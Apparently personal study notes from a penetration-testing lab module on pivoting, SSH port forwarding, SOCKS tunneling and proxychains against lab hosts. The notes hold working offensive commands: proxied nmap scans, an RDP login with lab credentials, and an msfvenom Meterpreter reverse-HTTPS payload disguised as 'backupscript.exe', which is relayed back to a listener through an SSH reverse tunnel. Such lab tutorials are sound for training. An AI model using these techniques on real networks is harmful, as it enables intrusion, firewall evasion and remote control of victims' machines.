--------------------

### Pivoting,Tunneling and Port Forwarding

-------------------

- Pivoting means moving from one part of a network to another part through a compromised host to find more compromised segments of a network.
- Pivoting's primary use is to defeat segmentation (both physically and virtually) to access an isolated network. Tunneling, on the other hand, is a subset of pivoting. Tunneling encapsulates network traffic into another protocol and routes traffic through it.
- We have a key we need to send to a partner, but we do not want anyone who sees our package to know it is a key. So we get a stuffed animal toy and hide the key inside with instructions about what it does. We then package the toy up and send it to our partner. Anyone who inspects the box will see a simple stuffed toy, not realizing it contains something else. Only our partner will know that the key is hidden inside and will learn how to access and use it once delivered.
- Lateral movement can be described as a technique used to further our access to additional hosts, applications, and services within a network environment.Lateral movement can also help us gain access to specific domain resources we may need to elevate our privileges. Lateral Movement often enables privilege escalation across hosts.
- Tunneling involves  using various protocols to shuttle traffic in/out of a network where there is a chance of our traffic being detected. A good example involves masking our Command and Control traffic with the aid of `HTTP` and `HTTPS` traffic.If the packet were formed properly, it would be forwarded to our Control server. If it were not, it would be redirected to another website, potentially throwing off the defender checking it out.

--------------------

### Networking behind Pivoting

---------------------

- Ip addressing and NIC-: Every computer that is communicating on a network needs an IP address. If it doesn't have one, it is not on a network. The IP address is assigned in software and usually obtained automatically from a DHCP server. It is also common to see computers with statically assigned IP addresses. Static IP assignment is common with:
  - Servers
  - Routers
  - Switch Virtual Interfaces
  - Printers
  - And any devices that are providing critical services to the network

- Whether assigned dynamically or statically, the IP address is assigned to a Network Interface Controller (NIC).
- Commonly, the NIC is referred to as a Network Interface Card or Network Adapter. A computer can have multiple NICs (physical and virtual), meaning it can have multiple IP addresses assigned, allowing it to communicate on various networks. Identifying pivoting opportunities will often depend on the specific IPs assigned to the hosts we compromise because they can indicate the networks compromised hosts can reach. This is why it is important for us to always check for additional NICs using commands like `ifconfig` (in macOS and Linux) and `ipconfig` (in Windows).
- Every IPv4 address will have a corresponding subnet mask. If an IP address is like a phone number, the subnet mask is like the area code. Remember that the subnet mask defines the network & host portion of an IP address. When network traffic is destined for an IP address located in a different network, the computer will send the traffic to its assigned default gateway. The default gateway is usually the IP address assigned to a NIC on an appliance acting as the router for a given LAN. In the context of pivoting, we need to be mindful of what networks a host we land on can reach, so documenting as much IP addressing information as possible on an engagement can prove helpful.
- Check Routing tables with `netstat -r` and `ip route` on windows.

--------------------

### Protocols, ports & services

--------------------

- Protocols are the rules that govern network communications. Many protocols and services have corresponding ports that act as identifiers. Logical ports aren't physical things we can touch or plug anything into. They are in software assigned to applications. When we see an IP address, we know it identifies a computer that may be reachable over a network. When we see an open port bound to that IP address, we know that it identifies an application we may be able to connect to. Connecting to specific ports that a device is listening on can often allow us to use ports & protocols that are permitted in the firewall to gain a foothold on the network.
- Let's take, for example, a web server using HTTP (often listening on port 80). The administrators should not block traffic coming inbound on port 80. This would prevent anyone from visiting the website they are hosting. This is often a way into the network environment, through the same port that legitimate traffic is passing. We must not overlook the fact that a source port is also generated to keep track of established connections on the client-side of a connection. We need to remain mindful of what ports we are using to ensure that when we execute our payloads, they connect back to the intended listeners we set up. We will get creative with the use of ports throughout this module.

------------------- 

### Dynamic Port Forwarding with SSH and SOCKS Tunneling

-------------------

- Port forawrding involves redirecting a communication request from one port to another port.Port forwarding uses TCP as the primary communication layer to provide interactive communication for the forwarded port. However, different application layer protocols such as SSH or even SOCKS (non-application layer) can be used to encapsulate the forwarded traffic. This can be effective in bypassing firewalls and using existing services on your compromised host to pivot to other networks.
- Example-:

![image](https://github.com/user-attachments/assets/8b0a9a0c-1cd6-4ea8-b6c9-4df38673b238)

- Scanning the pivot target-:

![image](https://github.com/user-attachments/assets/214883ca-e00e-4eaf-8277-e10027245e60)

- The Nmap output shows that the SSH port is open. To access the MySQL service, we can either SSH into the server and access MySQL from inside the Ubuntu server, or we can port forward it to our localhost on port 1234 and access it locally. A benefit of accessing it locally is if we want to execute a remote exploit on the MySQL service, we won't be able to do it without port forwarding. This is due to MySQL being hosted locally on the Ubuntu server on port 3306.
- We'll use ssh to portforward the mysql service.Add `-N` to make it non verbose,Syntax-:

```bash
ssh -N -L [attacker's port]:localhost:[internal service port] ubuntu@10.129.202.64
```
-  Forwarding multiple ports-:

```bash
ssh -N -L [attacker's port]:localhost:[internal service port] -L [attacker's port]:localhost:[internal service port] ubuntu@10.129.202.64
```

![image](https://github.com/user-attachments/assets/862c42e8-c15d-4ebe-aff3-5d0124f91075)

-----------------

### Setting up for pivot-:

-----------------

- Now, if you type ifconfig on the Ubuntu host, you will find that this server has multiple NICs: 
    - One connected to our attack host (ens192)
    - One communicating to other hosts within a different network (ens224)
    - The loopback interface (lo).

- Unlike the previous scenario where we knew which port to access, in our current scenario, we don't know which services lie on the other side of the network. So, we can scan smaller ranges of IPs on the network (172.16.5.1-200) network or the entire subnet (172.16.5.0/23). We cannot perform this scan directly from our attack host because it does not have routes to the 172.16.5.0/23 network. To do this, we will have to perform dynamic port forwarding and pivot our network packets via the Ubuntu server. We can do this by starting a SOCKS listener on our local host (personal attack host or Pwnbox) and then configure SSH to forward that traffic via SSH to the network (172.16.5.0/23) after connecting to the target host.

- This is called SSH tunneling over SOCKS proxy. SOCKS stands for Socket Secure, a protocol that helps communicate with servers where you have firewall restrictions in place. Unlike most cases where you would initiate a connection to connect to a service, in the case of SOCKS, the initial traffic is generated by a SOCKS client, which connects to the SOCKS server controlled by the user who wants to access a service on the client-side. Once the connection is established, network traffic can be routed through the SOCKS server on behalf of the connected client.

- This technique is often used to circumvent the restrictions put in place by firewalls, and allow an external entity to bypass the firewall and access a service within the firewalled environment. One more benefit of using SOCKS proxy for pivoting and forwarding data is that SOCKS proxies can pivot via creating a route to an external server from NAT networks. SOCKS proxies are currently of two types: SOCKS4 and SOCKS5. SOCKS4 doesn't provide any authentication and UDP support, whereas SOCKS5 does provide that. Let's take an example of the below image where we have a NAT'd network of 172.16.5.0/23, which we cannot access directly.


----------------

### Dynamic port fowarding with ssh and proxychains

----------------

- In dynamic portforwarding,we'll set ssh to receive packets.The SSH server responds with an acknowledgment, and the SSH client then starts listening on localhost:9050.
- Whatever data you send here will be broadcasted to the entire network (172.16.5.0/23) over SSH.
- SSH syntax-:

```bash
ssh -fND 9050 ubuntu@10.129.202.64
```
- After setting up dynamic port forwarding, a tool like proxychains is required which is capable of redirecting TCP connections through TOR, SOCKS, and HTTP/HTTPS proxy servers and also allows us to chain multiple proxy servers together.Using proxychains, we can hide the IP address of the requesting host as well since the receiving host will only see the IP of the pivot host. Proxychains is often used to force an application's TCP traffic to go through hosted proxies like SOCKS4/SOCKS5, TOR, or HTTP/HTTPS proxies.
- To inform proxychains to use port 9050,you have to make a configuration.Add to `/etc/proxychains.conf`-:

```conf
socks4 127.0.0.1 9050
```

- Confirm it-:

![image](https://github.com/user-attachments/assets/5f6b7c23-4004-43cd-b7b3-aeb255e9f81d)

- Using proxychains with nmap-:

```bash
proxychains nmap -sn 172.16.5.1-200
```

![image](https://github.com/user-attachments/assets/baa1e850-0471-4bf4-9eba-cee330cfd139)

- This part of packing all your Nmap data using proxychains and forwarding it to a remote server is called SOCKS tunneling. One more important note to remember here is that we can only perform a full TCP connect scan over proxychains. The reason for this is that proxychains cannot understand partial packets. If you send partial packets like half connect scans, it will return incorrect results. We also need to make sure we are aware of the fact that host-alive checks may not work against Windows targets because the Windows Defender firewall blocks ICMP requests (traditional pings) by default.Enumerating windows host-:

```bash
proxychains nmap -v -Pn -sT 172.16.5.19 
```
or

```bash
proxychains nmap -sVT 172.16.5.19 -Pn
```

-----------------

### Using proxychains with Metasploit

----------------

- Syntax-:

```
proxychains msfconsole
```

![image](https://github.com/user-attachments/assets/05efc465-adbf-48e9-824d-6a99de469517)

- Use msfconsole module `rdp_scanner` to check if rdp is running on port `3389`.

```msfconsole
search "rdp_scanner"
```
- set host with `set rhosts <ip>`
- Run-:

![image](https://github.com/user-attachments/assets/24eda74b-5302-45dd-8cb8-a568f90654cb)

- Connecting to rdp with xfreerdp-:

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

- Running it-:

![image](https://github.com/user-attachments/assets/e3601d9b-5f37-4421-b0d8-f2327c362cdd)

---------------------

### Remote/Reverse Portforwarding with SSH

--------------------

- We have seen local port forwarding, where SSH can listen on our local host and forward a service on the remote host to our port, and dynamic port forwarding, where we can send packets to a remote network via a pivot host. But sometimes, we might want to forward a local service to the remote port as well. Let's consider the scenario where we can RDP into the Windows host Windows A. As can be seen in the image below, in our previous case, we could pivot into the Windows host via the Ubuntu server.

- What if we want to gain a reverse shell on the internal victim server.The windows host can only communicate to hosts within `172.16.5.0/23` network.If we start a Metasploit listener on our attack host and try to get a reverse shell, we won't be able to get a direct connection here because the Windows server doesn't know how to route traffic leaving its network (172.16.5.0/23) to reach the 10.129.x.x (the Academy Lab network).
- In this case,we might want to find a pivot host,which is a common connection point between our attack host and the Windows server.In our case, our pivot host would be the Ubuntu server since it can connect to both: our attack host and the Windows target. To gain a Meterpreter shell on Windows, we will create a Meterpreter HTTPS payload using msfvenom, but the configuration of the reverse connection for the payload would be the Ubuntu server's host IP address (172.16.5.129). We will use the port 8080 on the Ubuntu server to forward all of our reverse packets to our attack hosts' 8000 port, where our Metasploit listener is running.

- Creating a msfvenom payload-:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```
![image](https://github.com/user-attachments/assets/09caec8d-8f58-4ae9-96d0-31eb17c30d6d)

- Configure multi handler

```msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 8000
run
```
![image](https://github.com/user-attachments/assets/988bcee2-ae20-43b0-92f1-a5e25e299ebe)

- Transfer payload to pivot host with scp-:

```ssh
scp filename ubuntu@host:~/
```

![image](https://github.com/user-attachments/assets/ef9a0e0d-a6d3-4a82-8a21-baf3e600c92f)

- Start a python web server on the Internal Pivost Host-:

- Downloading the file on the victim windows server-:

![image](https://github.com/user-attachments/assets/ee3b400c-f5c8-4a85-8d4b-02ff633e18ad)

- Dynamic port forwarding Syntax-:

```bash
ssh -R <InternalIPofPivotHost>:[listening port on internal host]:0.0.0.0:[target-Attacker'sport] ubuntu@<ipAddressofTarget> -vN
```
![image](https://github.com/user-attachments/assets/b6c2180d-1fa3-4ac9-80f9-ca4631d7d7f9)

- Execute payload-:

![image](https://github.com/user-attachments/assets/b338454f-6908-4f8f-bde0-93d577e0b535)

- Received over meterpreter-:

![image](https://github.com/user-attachments/assets/776f8f42-c9e1-42bd-8d09-89528ce9b300)

------------------












